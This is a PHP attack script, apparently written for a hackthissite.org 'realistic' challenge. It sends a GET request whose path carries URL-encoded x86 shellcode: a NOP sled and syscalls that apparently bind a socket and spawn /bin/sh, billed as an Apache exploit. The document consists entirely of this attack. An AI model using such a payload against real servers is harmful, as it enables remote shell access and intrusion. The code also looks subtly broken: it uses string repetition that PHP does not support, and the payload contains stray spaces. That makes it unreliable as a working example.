<?php
$host = "www.hackthissite.org";
$ref = "/missions/realistic/3/some.html";
//apache exploit
$exploit = ('%90'*128).'%89%e6%31%c0%31 %db%89%f1%b0%02%89%06%b0%01%89%46%04%b0%06%89%46%08%b0%66%b3%01%cd%80%89%06%b0%02%66%89%46%0c%b0%77%66%89%46%0e%8d%46%0c%89%46%04%31%c0%89%46%10%b0%10%89%46%08% b0%66%b3%02%cd%80%b0%01%89%46%04%b0%66%b3%04%cd%80%31%c0%89%46%04%89%46%08%b0%66%b3%05%cd%80%88%c3%b0%3f%31%c9%cd%80%b0%3f%b1%01%cd%80%b0%3f%b1%02%cd%80%b8%23%62%69%6e%89%06%b8%23%73%68%23%89%46%04%31%c0%88%46%07%b0%30%2c%01%88%46%04%88%06%89%76%08%31%c0%89%46%0c%b0%0b%89%f3%8d%4e%08%8d%56%0c%cd%80%31%c0%b0%01%31%db%cd %80%3FC%3FC%3FCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCC%77%ae%34%08CCCCCCCCCCCCCCCCCCCCCCCCCCC%3FC%3F';
$data = "<h1>HEHE</h1>";
$len = strlen($data);
$fp = fsockopen($host,80);
fwrite($fp, "GET ".$ref.$exploit." HTTP/1.1\r\n");
fwrite($fp, "Host:".$host."\r\n");
fwrite($fp, "Content-Length:$len\r\n\r\n");
fwrite($fp, $data."\r\n\r\n");
while (!feof($fp)) {
	echo fgets($fp, 128);
}
fclose($fp);
?>